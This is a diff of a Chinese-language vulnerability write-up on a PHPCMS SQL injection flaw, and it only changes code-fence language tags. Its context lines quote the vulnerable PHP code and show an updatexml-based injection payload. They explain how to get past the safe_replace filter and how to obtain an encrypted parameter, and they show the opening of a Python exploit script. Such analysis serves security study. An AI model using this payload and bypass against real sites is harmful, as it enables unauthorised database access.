@@ -3,7 +3,7 @@
 
 漏洞产生的地方在`/phpcms/modules/content/down.php`文件中:
 
-```
+```php
 public function init() {
 	$a_k = trim($_GET['a_k']);
 	if(!isset($a_k)) showmessage(L('illegal_parameters'));
@@ -39,7 +39,7 @@ public function init() {
 
 phpcms 这个sqli注入漏洞就利用了parse_str函数的前两个漏洞，首先$id未初始化，可以通过parse_str函数带入， 其次parse_str函数可以将%27转换为单引号
 
-```
+```php
 $a_k = "{"aid":0,"src":"&id=%27 and updatexml(1,concat(1,(user())),1)%23&modelid=1&catid=1&m=1&f=","filename":""}"
 $catid = "1"
 $f = "","filename":""}"
@@ -56,7 +56,7 @@ $id = "' and updatexml(1,concat(1,(user())),1)#"
 
 那么获取$a_k的值呢？  $a_k 是通过phpcms的sys_auth函数加密后的值， 这个函数在`/phpcms/libs/classes/param.class.php` 文件的set_cookie, get_cookie有调用，因此我们去寻找搜索以下`param::set_cookie`, 在attachment 模块部分发现一个显而易见的操控点
 
-```
+```php
 public function swfupload_json() {
 	$arr['aid'] = intval($_GET['aid']);
 	$arr['src'] = safe_replace(trim($_GET['src']));
@@ -76,7 +76,7 @@ public function swfupload_json() {
 
 不过再执行swfupload_json 需要一点条件， attachement.php的控制器文件的构造函数如下：
 
-```
+```php
 function __construct() {
 	pc_base::load_app_func('global');
 	$this->upload_url = pc_base::load_config('system','upload_url');
@@ -98,7 +98,7 @@ function __construct() {
 
 这就来到`/phpcms/modules/wap/index.php` 中：
 
-```
+```php
 function __construct() {		
 	$this->db = pc_base::load_model('content_model');
 	$this->siteid = isset($_GET['siteid']) && (intval($_GET['siteid']) > 0) ? intval(trim($_GET['siteid'])) : (param::get_cookie('siteid') ? param::get_cookie('siteid') : 1);
@@ -130,7 +130,7 @@ $json_str = json_encode($arr);
 
 这三个参数， aid用了intval,filename用了urlencode和safe_replace函数，src用safe_replace函数过滤，那么这个函数是否可以绕过呢？  答案是的，我们来看下这个函数的定义，在`phpcms/libs/functions/global.func.php`文件中:
 
-```
+```php
 function safe_replace($string) {
 	$string = str_replace('%20','',$string);
 	$string = str_replace('%27','',$string);
@@ -173,7 +173,7 @@ function safe_replace($string) {
 
 exp:
 
-```
+```py
 #!/usr/bin/env python
 # -*- coding: utf-8 -*-
 """
